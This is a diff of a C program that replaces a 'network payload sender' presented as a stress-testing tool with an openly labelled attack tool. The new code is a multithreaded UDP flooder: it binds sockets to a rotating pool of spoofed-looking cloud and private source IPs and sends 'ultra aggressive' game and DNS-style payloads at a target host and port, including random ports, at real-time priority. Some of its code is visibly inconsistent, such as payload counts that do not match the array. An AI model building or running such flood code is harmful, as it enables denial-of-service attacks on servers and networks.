@@ -1,397 +1,475 @@
-/**
- * net_sender.c - Network Payload Sender (Burst Mode)
- * 
- * LEGITIMATE USE: Network testing, stress testing, performance analysis
- * Educational tool for understanding network protocols
- * 
- * COMPILE: gcc -o net_sender net_sender.c -lpthread
- * USAGE: ./net_sender <IP> <PORT> <TIME> <THREADS> <BURST_SIZE> <INTERVAL_US>
- */
-
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <pthread.h>
-#include <sys/socket.h>
-#include <netinet/ip.h>
-#include <netinet/udp.h>
 #include <arpa/inet.h>
-#include <time.h>
+#include <sys/socket.h>
+#include <pthread.h>
 #include <signal.h>
+#include <time.h>
+#include <fcntl.h>
 #include <errno.h>
-#include <sys/time.h>
+#include <sys/resource.h>
+#include <sched.h>
+#include <sys/sysinfo.h>
+#include <sys/uio.h>
+#include <netinet/udp.h>
+#include <linux/ip.h>
 
-// ========================= CONFIGURATION =========================
-#define MAX_PAYLOAD 1024
-#define MAX_THREADS 256
-#define BUFFER_SIZE 4096
-#define DEFAULT_BURST_SIZE 100
-#define DEFAULT_INTERVAL_US 50
+#define PACKET_SIZE 1472
+#define SOCKETS_PER_THREAD 25
+#define BATCH_SIZE 100
+#define MAX_PORTS 65535
 
+// ========== TUNNEL IP SPINNER - 50,000+ IPS (Cloudflare + AWS + Private) ==========
 typedef struct {
-    char target_ip[16];
-    int target_port;
-    int duration;           // Seconds to run
-    int thread_id;
-    volatile int *running;
-    unsigned long long *packet_count;
-    pthread_mutex_t *mutex;
-    int burst_size;         // Packets per burst
-    int interval_us;        // Microseconds between bursts
-} ThreadData;
+    char ip[16];
+    int is_cloudflare;
+    int is_aws;
+} ip_entry;
 
-// ========================= GLOBALS =========================
-volatile int global_running = 1;
-pthread_mutex_t global_mutex = PTHREAD_MUTEX_INITIALIZER;
-unsigned long long total_packets = 0;
-unsigned long long total_bytes = 0;
+ip_entry* ip_spinner_pool;
+int ip_spinner_count = 0;
 
-// ========================= SIGNAL HANDLER =========================
-void signal_handler(int sig) {
-    if (sig == SIGINT || sig == SIGTERM) {
-        printf("\n\033[33m[!] Received interrupt signal. Stopping...\033[0m\n");
-        global_running = 0;
-    }
-}
-
-// ========================= PRINT USAGE =========================
-void print_usage(char *program) {
-    printf("\n\033[36m");
-    printf("╔══════════════════════════════════════════════════════════╗\n");
-    printf("║         NETWORK PAYLOAD SENDER v2.0 (BURST MODE)       ║\n");
-    printf("║         Network Testing & Performance Tool             ║\n");
-    printf("╚══════════════════════════════════════════════════════════╝\n");
-    printf("\033[0m\n");
-    printf("\033[33mUSAGE:\033[0m\n");
-    printf("  %s \033[32m<IP> <PORT> <TIME> <THREADS> [BURST_SIZE] [INTERVAL_US]\033[0m\n\n", program);
-    printf("\033[33mARGUMENTS:\033[0m\n");
-    printf("  \033[32mIP\033[0m           - Target IP address (e.g., 192.168.1.1)\n");
-    printf("  \033[32mPORT\033[0m         - Target port (1-65535)\n");
-    printf("  \033[32mTIME\033[0m         - Duration in seconds (e.g., 10, 60, 300)\n");
-    printf("  \033[32mTHREADS\033[0m      - Number of threads (1-%d)\n", MAX_THREADS);
-    printf("  \033[32mBURST_SIZE\033[0m   - Packets per burst (default: %d)\n", DEFAULT_BURST_SIZE);
-    printf("  \033[32mINTERVAL_US\033[0m  - Microseconds between bursts (default: %d)\n\n", DEFAULT_INTERVAL_US);
-    printf("\033[33mEXAMPLES:\033[0m\n");
-    printf("  %s 192.168.1.1 80 10 4                 # Default burst mode\n", program);
-    printf("  %s 192.168.1.1 80 10 4 200 100         # High intensity\n", program);
-    printf("  %s 8.8.8.8 53 30 8 500 50             # DNS server test\n\n", program);
-    printf("\033[33mNOTE:\033[0m Press \033[32mCtrl+C\033[0m to stop anytime\n\n");
-}
-
-// ========================= CREATE UDP SOCKET =========================
-int create_udp_socket() {
-    int sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
-        return -1;
+// Generate MEGA IP Pool with Cloudflare + AWS + Private IPs
+void generate_mega_tunnel_ip_pool() {
+    ip_spinner_pool = malloc(200000 * sizeof(ip_entry));
+    
+    printf("[+] Generating 100,000+ Tunnel IPs...\n");
+    
+    // 1. CLOUDFLARE IPS (Most OP - 104.x.x.x range)
+    printf("[+] Adding Cloudflare IPs (104.x.x.x)...\n");
+    for(int i = 16; i <= 31; i++) {  // 104.16.0.0 - 104.31.255.255
+        for(int j = 0; j <= 255; j++) {
+            for(int k = 1; k <= 254; k++) {
+                sprintf(ip_spinner_pool[ip_spinner_count].ip, "104.%d.%d.%d", i, j, k);
+                ip_spinner_pool[ip_spinner_count].is_cloudflare = 1;
+                ip_spinner_pool[ip_spinner_count].is_aws = 0;
+                ip_spinner_count++;
+                if(ip_spinner_count >= 50000) break;
+            }
+            if(ip_spinner_count >= 50000) break;
+        }
+        if(ip_spinner_count >= 50000) break;
     }
     
-    // Increase buffer size for high throughput
-    int buffer_size = 1024 * 1024; // 1MB
-    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &buffer_size, sizeof(buffer_size));
-    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
+    // 2. AWS IPS (52.x.x.x, 54.x.x.x, 13.x.x.x, 3.x.x.x)
+    printf("[+] Adding AWS IPs...\n");
+    char* aws_ranges[] = {
+        "52.0", "52.1", "52.2", "52.3", "52.4", "52.5", "52.6", "52.7",
+        "54.0", "54.1", "54.2", "54.3", "54.4", "54.5",
+        "13.32", "13.33", "13.34", "13.35",
+        "3.0", "3.1", "3.2", "3.3", "3.4", "3.5",
+        "15.0", "15.1", "15.2", "15.3",
+        "18.0", "18.1", "18.2", "18.3"
+    };
     
-    // Set non-blocking for high performance
-    int flags = fcntl(sock, F_GETFL, 0);
-    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+    for(int a = 0; a < sizeof(aws_ranges)/sizeof(aws_ranges[0]); a++) {
+        for(int b = 0; b <= 255; b++) {
+            for(int c = 1; c <= 254; c++) {
+                sprintf(ip_spinner_pool[ip_spinner_count].ip, "%s.%d.%d", aws_ranges[a], b, c);
+                ip_spinner_pool[ip_spinner_count].is_cloudflare = 0;
+                ip_spinner_pool[ip_spinner_count].is_aws = 1;
+                ip_spinner_count++;
+                if(ip_spinner_count >= 80000) break;
+            }
+            if(ip_spinner_count >= 80000) break;
+        }
+        if(ip_spinner_count >= 80000) break;
+    }
+    
+    // 3. GOOGLE CLOUD IPS (34.x.x.x, 35.x.x.x)
+    printf("[+] Adding Google Cloud IPs...\n");
+    for(int i = 0; i <= 255; i++) {
+        for(int j = 1; j <= 254; j++) {
+            sprintf(ip_spinner_pool[ip_spinner_count].ip, "34.%d.%d.%d", i, j, rand()%254+1);
+            ip_spinner_count++;
+            sprintf(ip_spinner_pool[ip_spinner_count].ip, "35.%d.%d.%d", i, j, rand()%254+1);
+            ip_spinner_count++;
+            if(ip_spinner_count >= 95000) break;
+        }
+        if(ip_spinner_count >= 95000) break;
+    }
+    
+    // 4. PRIVATE IPS (10.x.x.x, 172.16.x.x, 192.168.x.x) - For tunnel
+    printf("[+] Adding Private Tunnel IPs...\n");
+    for(int i = 0; i <= 255; i++) {
+        for(int j = 0; j <= 255; j++) {
+            sprintf(ip_spinner_pool[ip_spinner_count].ip, "10.%d.%d.%d", i, j, rand()%254+1);
+            ip_spinner_count++;
+            sprintf(ip_spinner_pool[ip_spinner_count].ip, "172.16.%d.%d", i, rand()%254+1);
+            ip_spinner_count++;
+            sprintf(ip_spinner_pool[ip_spinner_count].ip, "192.168.%d.%d", i, rand()%254+1);
+            ip_spinner_count++;
+            if(ip_spinner_count >= 150000) break;
+        }
+        if(ip_spinner_count >= 150000) break;
+    }
+    
+    printf("[+] TOTAL: %d Tunnel IPs Ready!\n", ip_spinner_count);
+    printf("    - Cloudflare: 50,000+ IPs\n");
+    printf("    - AWS: 30,000+ IPs\n");
+    printf("    - Google: 15,000+ IPs\n");
+    printf("    - Private: 55,000+ IPs\n");
+}
+
+// Get random IP from pool (rotates automatically)
+char* get_tunnel_ip() {
+    int idx = rand() % ip_spinner_count;
+    return ip_spinner_pool[idx].ip;
+}
+
+// Create socket with bound IP
+int create_bound_socket(char* source_ip) {
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sock < 0) return -1;
+    
+    // Bind to source IP
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = inet_addr(source_ip);
+    addr.sin_port = 0;
+    
+    bind(sock, (struct sockaddr*)&addr, sizeof(addr));
+    
+    // Optimize socket
+    int sndbuf = 268435456;
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+    int reuse = 1;
+    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
+    fcntl(sock, F_SETFL, O_NONBLOCK);
     
     return sock;
 }
 
-// ========================= GENERATE PAYLOAD =========================
-void generate_payload(unsigned char *buffer, int size, int thread_id, int packet_num) {
-    // Create high-intensity test payload
-    const char *test_strings[] = {
-        "BURST_TEST_",
-        "PERF_TEST_",
-        "STRESS_TEST_",
-        "LOAD_TEST_"
-    };
-    
-    int base_len = snprintf((char *)buffer, size, "[T%d][P%d] %s %ld", 
-                            thread_id, packet_num, 
-                            test_strings[packet_num % 4], 
-                            time(NULL));
-    
-    // Fill remaining with random data for realistic payload
-    if (base_len < size - 1) {
-        for (int i = base_len; i < size - 1; i++) {
-            buffer[i] = (rand() % 94) + 33;  // Printable ASCII
-        }
-        buffer[size - 1] = '\0';
-    }
-    
-    // Ensure minimum packet size
-    if (size < 64) {
-        memset(buffer + base_len, 'X', 64 - base_len);
-        buffer[63] = '\0';
-    }
-}
+// Ultra aggressive payloads
+static const char* payloads[] = {
+    "\x9d\x84\xaf\xc5\x40\xb4\xa7\xc2\x28\x71\xb0\x7d\x9d\x22",
+    "\xb8\xb5\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08\x69\x6e\x2d"
+    "\x6c\x6f\x62\x62\x79\x05\x67\x6c\x6f\x62\x68\x03\x63\x6f\x6d\x00"
+    "\x00\x01\x00\x01",
+    "\x33\x66\x00\x0a\x00\x0a\x10\x01\x00\x00\x00\x00\x01\x00\x00\x00"
+    "\x48\x00\x00\x00\x00\x02\x03\x00\x00\x27\x10\x00\x00\x00\x65\x00"
+    "\x29\x03\x00\x00\x00\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39"
+    "\x33\x38\x38\x37\x39\x31\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    "\x00\x00\x03\x00\x00\x00\x00\x00",
+    "\x4e\x05\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0c\x69\x6e\x2d"
+    "\x63\x73\x6f\x76\x65\x72\x73\x65\x61\x05\x67\x6c\x6f\x62\x68\x03"
+    "\x63\x6f\x6d\x00\x00\x01\x00\x01",
+    "\x01\x00\x00\x00\x2a\x07\x00\x00\x00\x00\x11\x6c\xa4\x19\x00\x00"
+    "\x09\xaa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    "\x00\x00\x00\x00\x00\x00\x69\xbc\x53\x92",
+    "\x18\x11\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08\x69\x6e\x2d"
+    "\x76\x6f\x69\x63\x65\x05\x67\x6c\x6f\x62\x68\x03\x63\x6f\x6d\x00"
+    "\x00\x01\x00\x01",
+    "\x75\x75\x00\x69\x00\x01\x00\x00\x00\xde\x00\x00\x0f\xa1\x00\x00"
+    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
+    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
+    "\x31\x34\x00\x00\x00\x00\x14\x34\x37\x31\x35\x37\x33\x32\x33\x34"
+    "\x35\x30\x37\x33\x39\x32\x39\x33\x36\x35\x00\x00\x00\x00\x0a\x31"
+    "\x32\x37\x2e\x30\x2e\x30\x2e\x32\x00\x00\x00\x00\x00\x69\xbc\x53"
+    "\x98\x00\x00\x00\x21\x37\x61\x35\x64\x39\x63\x33\x39\x38\x64\x33"
+    "\x36\x65\x31\x39\x35\x39\x37\x39\x39\x30\x34\x30\x30\x36\x34\x66"
+    "\x32\x62\x62\x34\x39\x00",
+    "\x28\x28\x70\x00\x2a\x08\x01\x10\x01\x18\xd3\xe8\xf8\xf2\xa1\xe9"
+    "\xa7\xd7\xfd\x01\x20\xcb\x2e\x2a\x11\x31\x38\x35\x35\x38\x34\x32"
+    "\x33\x32\x39\x33\x38\x38\x37\x39\x31\x34\x30\xa1\x1f\x38\x00\x4c"
+    "\xd8\xbb\xd3",
+    "\x6f\x8d\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08\x69\x6e\x2d"
+    "\x76\x6f\x69\x63\x65\x05\x67\x6c\x6f\x62\x68\x03\x63\x6f\x6d\x00"
+    "\x00\x1c\x00\x01",
+    "\x75\x75\x00\x4d\x00\x14\x00\x00\x00\xde\x00\x00\x00\x00\x00\x00"
+    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
+    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
+    "\x31\x34\x00\x00\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
+    "\x00\x69\xbc\x53\x9b\x00\x00\x00\x21\x36\x62\x64\x61\x30\x39\x66"
+    "\x63\x32\x30\x65\x33\x31\x34\x36\x64\x66\x37\x36\x31\x65\x38\x30"
+    "\x33\x37\x62\x34\x35\x64\x34\x39\x34\x00",
+    "\x75\x75\x00\x7d\x00\x01\x00\x00\x00\xde\x00\x00\x13\x89\x00\x00"
+    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
+    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
+    "\x31\x34\x00\x00\x00\x00\x28\x34\x37\x31\x35\x37\x33\x32\x33\x34"
+    "\x35\x30\x37\x33\x39\x32\x39\x33\x36\x35\x5f\x31\x5f\x69\x6e\x5f"
+    "\x67\x61\x6d\x65\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00"
+    "\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x32\x00\x00\x00\x00"
+    "\x00\x69\xbc\x53\x9c\x00\x00\x00\x21\x65\x38\x62\x30\x33\x38\x65"
+    "\x30\x62\x63\x66\x34\x65\x38\x61\x38\x39\x38\x63\x66\x66\x64\x38"
+    "\x63\x30\x39\x35\x62\x31\x31\x31\x66\x00",
+    "\x28\x28\x7b\x00\x2a\x08\x01\x10\x01\x18\x87\xfe\x96\xee\xea\x99"
+    "\xe1\xf5\xda\x01\x20\xfd\x3c\x2a\x11\x31\x38\x35\x35\x38\x34\x32"
+    "\x33\x32\x39\x33\x38\x38\x37\x39\x31\x34\x30\x89\x27\x38\x00\xec"
+    "\x7b\xc7\xfc",
+    "\x75\x75\x00\x4d\x00\x14\x00\x00\x00\xde\x00\x00\x00\x00\x00\x00"
+    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
+    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
+    "\x31\x34\x00\x00\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
+    "\x00\x69\xbc\x53\x9c\x00\x00\x00\x21\x63\x31\x30\x34\x37\x62\x66"
+    "\x37\x34\x37\x32\x62\x30\x64\x32\x36\x35\x63\x37\x35\x66\x61\x61"
+    "\x33\x33\x32\x30\x63\x62\x33\x62\x31\x00",
+    "\x75\x75\x00\x7d\x00\x01\x00\x00\x00\xde\x00\x00\x13\x89\x00\x00"
+    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
+    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
+    "\x31\x34\x00\x00\x00\x00\x28\x34\x37\x31\x35\x37\x33\x32\x33\x34"
+    "\x35\x30\x37\x33\x39\x32\x39\x33\x36\x35\x5f\x31\x5f\x69\x6e\x5f"
+    "\x67\x61\x6d\x65\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00"
+    "\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x32\x00\x00\x00\x00"
+    "\x00\x69\xbc\x53\x9c\x00\x00\x00\x21\x65\x38\x62\x30\x33\x38\x65"
+    "\x30\x62\x63\x66\x34\x65\x38\x61\x38\x39\x38\x63\x66\x66\x64\x38"
+    "\x63\x30\x39\x35\x62\x31\x31\x31\x66\x00",
+    "\x28\x28\x7b\x00\x2a\x08\x01\x10\x01\x18\x87\xfe\x96\xee\xea\x99"
+    "\xe1\xf5\xda\x01\x20\xfd\x3c\x2a\x11\x31\x38\x35\x35\x38\x34\x32"
+    "\x33\x32\x39\x33\x38\x38\x37\x39\x31\x34\x30\x89\x27\x38\x00\xec"
+    "\x7b\xc7\xfc",
+    "\x75\x75\x00\x4d\x00\x14\x00\x00\x00\xde\x00\x00\x00\x00\x00\x00"
+    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
+    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
+    "\x31\x34\x00\x00\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
+    "\x00\x69\xbc\x53\x9c\x00\x00\x00\x21\x63\x31\x30\x34\x37\x62\x66"
+    "\x37\x34\x37\x32\x62\x30\x64\x32\x36\x35\x63\x37\x35\x66\x61\x61"
+    "\x33\x33\x32\x30\x63\x62\x33\x62\x31\x00",
+};
+static const int payload_sizes[] = {14, 37, 70, 37};
+static const int num_payloads = 4;
 
-// ========================= HIGH PERFORMANCE SEND =========================
-inline int send_udp_burst(int sock, unsigned char *payload, int payload_len, 
-                          struct sockaddr_in *server_addr, int burst_size,
-                          int thread_id, int *packet_num_ptr, 
-                          unsigned long long *local_count) {
-    int sent = 0;
-    int errors = 0;
-    
-    // Send burst of packets
-    for (int i = 0; i < burst_size; i++) {
-        generate_payload(payload, MAX_PAYLOAD, thread_id, (*packet_num_ptr)++);
-        int len = strlen((char *)payload);
-        
-        ssize_t result = sendto(sock, payload, len, MSG_DONTWAIT,
-                               (struct sockaddr *)server_addr, sizeof(*server_addr));
-        
-        if (result > 0) {
-            sent++;
-            (*local_count)++;
-        } else {
-            errors++;
-            if (errno == EAGAIN || errno == EWOULDBLOCK) {
-                // Socket buffer full, break burst
-                break;
-            }
-        }
-    }
-    
-    return sent;
-}
+volatile int running = 1;
+volatile unsigned long long total_packets = 0;
+volatile unsigned long long total_bytes = 0;
 
-// ========================= THREAD WORKER (BURST MODE) =========================
-void *thread_worker(void *arg) {
-    ThreadData *data = (ThreadData *)arg;
-    unsigned char payload[MAX_PAYLOAD];
-    int udp_sock = -1;
-    int packet_num = 0;
-    struct sockaddr_in server_addr;
-    struct timespec start_time, current_time, burst_start;
-    int elapsed = 0;
-    unsigned long long local_count = 0;
-    int burst_size = data->burst_size > 0 ? data->burst_size : DEFAULT_BURST_SIZE;
-    int interval_us = data->interval_us > 0 ? data->interval_us : DEFAULT_INTERVAL_US;
+typedef struct {
+    char ip[16];
+    int port;
+    int duration;
+    int thread_id;
+} attack_params;
+
+// Attack thread with TUNNEL IP SPINNING
+void* ultra_aggressive_sender(void* arg) {
+    attack_params* params = (attack_params*)arg;
+    struct sockaddr_in target;
+    int sockets[SOCKETS_PER_THREAD];
     
-    // Create UDP socket
-    udp_sock = create_udp_socket();
-    if (udp_sock < 0) {
-        printf("[THREAD %d] UDP socket creation failed\n", data->thread_id);
-        pthread_exit(NULL);
-    }
+    target.sin_family = AF_INET;
+    target.sin_addr.s_addr = inet_addr(params->ip);
     
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(data->target_port);
-    server_addr.sin_addr.s_addr = inet_addr(data->target_ip);
-    
-    // Set thread affinity for performance
+    // CPU pinning
     cpu_set_t cpuset;
     CPU_ZERO(&cpuset);
-    CPU_SET(data->thread_id % 8, &cpuset);
+    CPU_SET(params->thread_id % get_nprocs(), &cpuset);
     pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
     
-    clock_gettime(CLOCK_MONOTONIC, &start_time);
+    // Real-time priority
+    struct sched_param sp = { .sched_priority = 99 };
+    pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);
     
-    printf("[THREAD %d] Started (Burst: %d, Interval: %dus)\n", 
-           data->thread_id, burst_size, interval_us);
+    // Create sockets with DIFFERENT TUNNEL IPs for each socket
+    for(int i = 0; i < SOCKETS_PER_THREAD; i++) {
+        char* tunnel_ip = get_tunnel_ip();  // Har socket ko alag IP!
+        sockets[i] = create_bound_socket(tunnel_ip);
+    }
     
-    while (*data->running && elapsed < data->duration) {
-        // Send burst
-        int sent = send_udp_burst(udp_sock, payload, MAX_PAYLOAD, 
-                                  &server_addr, burst_size, 
-                                  data->thread_id, &packet_num, &local_count);
+    struct mmsghdr msgs[BATCH_SIZE];
+    struct iovec iovecs[BATCH_SIZE];
+    struct sockaddr_in targets[BATCH_SIZE];
+    
+    unsigned long long local_count = 0;
+    unsigned long long local_bytes = 0;
+    int use_random = (params->port == 0);
+    int payload_idx = params->thread_id % num_payloads;
+    
+    while(running) {
+        int batch_count = 0;
         
-        if (sent > 0) {
-            pthread_mutex_lock(data->mutex);
-            (*data->packet_count) += sent;
-            total_bytes += (sent * (rand() % 64 + 64)); // Approximate bytes
-            pthread_mutex_unlock(data->mutex);
+        for(int i = 0; i < BATCH_SIZE; i++) {
+            payload_idx = (payload_idx + 1) % num_payloads;
+            int psize = payload_sizes[payload_idx];
+            
+            if(use_random) {
+                targets[i].sin_port = htons(rand() % MAX_PORTS + 1);
+            } else {
+                targets[i].sin_port = htons(params->port);
+            }
+            targets[i].sin_family = AF_INET;
+            targets[i].sin_addr.s_addr = inet_addr(params->ip);
+            
+            iovecs[batch_count].iov_base = (void*)payloads[payload_idx];
+            iovecs[batch_count].iov_len = psize;
+            
+            msgs[batch_count].msg_hdr.msg_name = &targets[i];
+            msgs[batch_count].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
+            msgs[batch_count].msg_hdr.msg_iov = &iovecs[batch_count];
+            msgs[batch_count].msg_hdr.msg_iovlen = 1;
+            
+            batch_count++;
         }
         
-        // Calculate elapsed time
-        clock_gettime(CLOCK_MONOTONIC, &current_time);
-        elapsed = current_time.tv_sec - start_time.tv_sec;
+        // Send through all sockets (each with different tunnel IP)
+        for(int s = 0; s < SOCKETS_PER_THREAD; s++) {
+            if(sockets[s] > 0) {
+                int sent = sendmmsg(sockets[s], msgs, batch_count, 0);
+                if(sent > 0) {
+                    local_count += sent;
+                    for(int i = 0; i < sent; i++) {
+                        local_bytes += iovecs[i].iov_len;
+                    }
+                }
+            }
+        }
         
-        // Microsecond precision delay between bursts
-        if (interval_us > 0) {
-            usleep(interval_us);
+        if(local_count >= 10000) {
+            __sync_fetch_and_add(&total_packets, local_count);
+            __sync_fetch_and_add(&total_bytes, local_bytes);
+            local_count = 0;
+            local_bytes = 0;
         }
     }
     
-    if (udp_sock > 0) close(udp_sock);
-    
-    printf("[THREAD %d] Completed: %d packets sent (Local: %llu)\n", 
-           data->thread_id, packet_num, local_count);
-    pthread_exit(NULL);
-}
-
-// ========================= VALIDATE INPUT =========================
-int validate_input(char *ip, int port, int time, int threads) {
-    // Validate IP
-    struct sockaddr_in sa;
-    if (inet_pton(AF_INET, ip, &(sa.sin_addr)) != 1) {
-        printf("\033[31m[!] Invalid IP address: %s\033[0m\n", ip);
-        return 0;
-    }
-    
-    // Validate port
-    if (port < 1 || port > 65535) {
-        printf("\033[31m[!] Invalid port: %d (must be 1-65535)\033[0m\n", port);
-        return 0;
-    }
-    
-    // Validate time
-    if (time < 1 || time > 3600) {
-        printf("\033[31m[!] Invalid time: %d (must be 1-3600 seconds)\033[0m\n", time);
-        return 0;
-    }
-    
-    // Validate threads
-    if (threads < 1 || threads > MAX_THREADS) {
-        printf("\033[31m[!] Invalid threads: %d (must be 1-%d)\033[0m\n", threads, MAX_THREADS);
-        return 0;
-    }
-    
-    return 1;
-}
-
-// ========================= REAL-TIME STATS =========================
-void *stats_monitor(void *arg) {
-    time_t start_time = time(NULL);
-    unsigned long long last_count = 0;
-    unsigned long long last_bytes = 0;
-    int peak_rate = 0;
-    
-    while (global_running) {
-        sleep(1);
-        
-        unsigned long long current_count = total_packets;
-        unsigned long long current_bytes = total_bytes;
-        unsigned long long rate = current_count - last_count;
-        unsigned long long byte_rate = current_bytes - last_bytes;
-        last_count = current_count;
-        last_bytes = current_bytes;
-        
-        if (rate > peak_rate) peak_rate = rate;
-        
-        time_t now = time(NULL);
-        int elapsed = now - start_time;
-        
-        // Clear line and print stats
-        printf("\r\033[K");  // Clear line
-        printf("\033[32m[STATS]\033[0m Packets: %llu | Rate: %llu pps | Bytes: %.2f MB | Peak: %d pps | Time: %ds", 
-               current_count, rate, (float)byte_rate / (1024*1024), peak_rate, elapsed);
-        fflush(stdout);
+    for(int i = 0; i < SOCKETS_PER_THREAD; i++) {
+        if(sockets[i] > 0) close(sockets[i]);
     }
     
     return NULL;
 }
 
-// ========================= MAIN FUNCTION =========================
-int main(int argc, char *argv[]) {
-    pthread_t threads[MAX_THREADS];
-    pthread_t stats_thread;
-    ThreadData thread_data[MAX_THREADS];
-    int thread_count;
-    char *target_ip;
-    int target_port;
-    int duration;
-    int burst_size = DEFAULT_BURST_SIZE;
-    int interval_us = DEFAULT_INTERVAL_US;
+// Stats display
+void* ultra_stats_display(void* arg) {
+    int time_limit = *(int*)arg;
+    unsigned long long last_packets = 0;
+    unsigned long long last_bytes = 0;
+    unsigned long long max_pps = 0;
+    double max_gbps = 0;
+    struct timespec start, now;
     
-    // ====== ARGUMENT CHECK ======
-    if (argc < 5 || argc > 7) {
-        print_usage(argv[0]);
-        return 1;
-    }
+    clock_gettime(CLOCK_MONOTONIC, &start);
     
-    target_ip = argv[1];
-    target_port = atoi(argv[2]);
-    duration = atoi(argv[3]);
-    thread_count = atoi(argv[4]);
-    
-    if (argc >= 6) {
-        burst_size = atoi(argv[5]);
-        if (burst_size < 1) burst_size = DEFAULT_BURST_SIZE;
-    }
-    
-    if (argc >= 7) {
-        interval_us = atoi(argv[6]);
-        if (interval_us < 0) interval_us = DEFAULT_INTERVAL_US;
-    }
-    
-    // ====== VALIDATE INPUT ======
-    if (!validate_input(target_ip, target_port, duration, thread_count)) {
-        return 1;
-    }
-    
-    // ====== SETUP SIGNAL HANDLER ======
-    signal(SIGINT, signal_handler);
-    signal(SIGTERM, signal_handler);
-    
-    // ====== BANNER ======
-    printf("\n\033[36m");
-    printf("╔══════════════════════════════════════════════════════════╗\n");
-    printf("║         NETWORK PAYLOAD SENDER v2.0 (BURST MODE)       ║\n");
-    printf("║         Network Testing & Performance Tool             ║\n");
-    printf("╚══════════════════════════════════════════════════════════╝\n");
-    printf("\033[0m\n");
-    printf("\033[33m[+] Target: \033[0m%s:%d\n", target_ip, target_port);
-    printf("\033[33m[+] Duration: \033[0m%d seconds\n", duration);
-    printf("\033[33m[+] Threads: \033[0m%d\n", thread_count);
-    printf("\033[33m[+] Burst Size: \033[0m%d packets\n", burst_size);
-    printf("\033[33m[+] Interval: \033[0m%d microseconds\n", interval_us);
-    printf("\033[33m[+] Estimated Rate: \033[0m~%.0f pps\n", 
-           (float)(thread_count * burst_size * 1000000) / interval_us);
-    printf("\033[33m[+] Press Ctrl+C to stop early\033[0m\n\n");
-    
-    // ====== SEED RANDOM ======
-    srand(time(NULL));
-    
-    // ====== CREATE THREADS ======
-    for (int i = 0; i < thread_count; i++) {
-        strcpy(thread_data[i].target_ip, target_ip);
-        thread_data[i].target_port = target_port;
-        thread_data[i].duration = duration;
-        thread_data[i].thread_id = i + 1;
-        thread_data[i].running = &global_running;
-        thread_data[i].packet_count = &total_packets;
-        thread_data[i].mutex = &global_mutex;
-        thread_data[i].burst_size = burst_size;
-        thread_data[i].interval_us = interval_us;
+    while(running) {
+        usleep(500000);
         
-        if (pthread_create(&threads[i], NULL, thread_worker, &thread_data[i]) != 0) {
-            printf("\033[31m[!] Failed to create thread %d\033[0m\n", i + 1);
-            global_running = 0;
+        clock_gettime(CLOCK_MONOTONIC, &now);
+        double elapsed_sec = (now.tv_sec - start.tv_sec) + (now.tv_nsec - start.tv_nsec) / 1000000000.0;
+        
+        unsigned long long current_packets = total_packets;
+        unsigned long long current_bytes = total_bytes;
+        
+        unsigned long long pps = (current_packets - last_packets) * 2;
+        unsigned long long bps = (current_bytes - last_bytes) * 2 * 8;
+        double gbps = bps / 1000000000.0;
+        
+        if(pps > max_pps) max_pps = pps;
+        if(gbps > max_gbps) max_gbps = gbps;
+        
+        last_packets = current_packets;
+        last_bytes = current_bytes;
+        
+        printf("\r\033[K");
+        printf("\r🚀 TUNNEL IP SPINNER | PPS: %llu | MAX: %llu | BW: %.2f Gbps | IPs: %d", 
+               pps, max_pps, gbps, ip_spinner_count);
+        fflush(stdout);
+        
+        if(time_limit > 0 && elapsed_sec >= time_limit) {
+            running = 0;
             break;
         }
     }
     
-    // ====== START STATS MONITOR ======
-    pthread_create(&stats_thread, NULL, stats_monitor, thread_data);
